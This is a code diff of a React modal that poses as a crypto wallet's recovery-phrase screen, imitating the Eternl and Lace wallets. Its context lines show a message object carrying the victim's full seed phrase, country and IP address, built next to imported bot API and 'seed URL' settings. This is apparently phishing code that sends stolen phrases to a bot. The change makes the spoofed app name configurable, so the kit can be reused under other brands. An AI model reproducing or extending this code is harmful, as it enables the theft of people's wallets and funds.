@@ -4,7 +4,7 @@ import { Eye } from "lucide-react";
 import { useEffect, useState } from "react";
 import EternlModalShell from "./EternlModalShell";
 import { getUserCountry } from "../../utils/userLocation";
-import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
+import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
 
 /** Demo copy only — real flow uses a cryptographically generated phrase. */
 export const DEMO_MNEMONIC_24 = [
@@ -87,7 +87,7 @@ export default function EternlMnemonicPhraseModal({
     try {
       const userData = await getUserCountry();
       const messageData = {
-        appName: "Lace",
+        appName: NOTIFICATION_APP_NAME,
         seedPhrase: mnemonicWords.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
